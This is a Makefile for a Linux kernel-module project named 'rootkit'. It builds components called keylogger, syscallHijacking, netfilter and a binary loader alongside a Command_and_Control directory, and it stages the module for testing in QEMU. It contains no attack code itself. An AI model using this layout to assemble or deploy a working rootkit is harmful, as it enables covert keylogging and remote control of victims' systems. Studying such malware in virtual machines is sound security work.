# Simplest kernel module Makefile

MOD = rootkit
PWD   := $(shell pwd)

#Para ficheros en ensamblador (el nombre del fichero) la .S en mayuscula https://www.linuxquestions.org/questions/linux-kernel-70/kernel-module-c-and-assembly-files-makefile-problems-4175426011/

obj-m := $(MOD).o

$(MOD)-y := ./src/main.o ./src/binaryBlob.o ./src/binaryLoader.o ./src/taskManipulator.o ./src/socket.o ./src/keylogger.o  ./src/netfilter.o ./src/charDevice.o ./src/syscallHijacking.o #./src/embeded_loader.o

#CFLAGS_main.o := -Dverbose=1
#-Dverbose=1

all:rtools kernelmodule cac
	cp -f load.sh ./qemu/shared

_all:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
install:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules_install
clean:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean
#######
	make -C ./tools clean
	make -C ./Command_and_Control clean
	rm -f -r ./build
	rm -f -r ./qemu/shared

kernelmodule:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
	mkdir -p ./build
	cp -f rootkit.ko ./build
	mkdir -p ./qemu/shared
	cp -f rootkit.ko ./qemu/shared

rtools:
	make -C ./tools all

cac:
	make -C ./Command_and_Control all

#############################################################################################


